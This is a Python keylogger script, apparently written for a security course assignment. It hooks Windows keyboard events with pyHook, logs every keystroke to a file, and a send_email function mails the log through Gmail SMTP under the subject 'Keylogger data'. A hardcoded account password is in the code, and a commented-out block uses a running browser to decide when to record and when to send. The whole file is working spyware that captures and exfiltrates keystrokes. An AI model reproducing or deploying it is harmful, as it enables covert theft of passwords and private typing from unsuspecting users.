import pythoncom, pyHook, sys, logging, smtplib
import time

file_log="log.txt"

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message) s')
    if (event.Ascii==13):
        keys='<ENTER>'
    elif (event.Ascii==8):
        keys='<BACK SPACE>'
    elif (event.Ascii==9):
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    logging.log(10, keys)
    return True

def start_logging():
    hook=pyHook.HookManager()
    hook.KeyDown=OnKeyboardEvent
    hook.HookKeyboard()
    pythoncom.PumpMessages()

def send_email(send_to='rishi12084@iiitd.ac.in'):
    global filecontent
    fp=open(file_log, 'r')
    filecontent=fp.read()
    server_name="smtp.gmail.com"
    port=587
    user="fcsassignment@gmail.com"
    password="bandar123"
    FROM=user
    TO=["rishimbn@gmail.com"]
    TO.append(send_to)
    subject="Keylogger data"
    content=filecontent
    message="""\
FROM: %s
TO: %s
SUBJECT: %s

%s

""" % (FROM, ", ".join(TO), subject, content)
    server=smtplib.SMTP(host=server_name, port=port)
    server.ehlo()
    server.starttls()
    server.login(user, password)
    server.sendmail(FROM, TO, message)
    server.close()

##def is_browser_running():
##    if (os.system('tasklist | find "firefox.exe"'))==0:
##        return true
##    else:
##        return false
##if (is_browser_running):
##    start_logging()
##else:
##    send_email()
##    
##
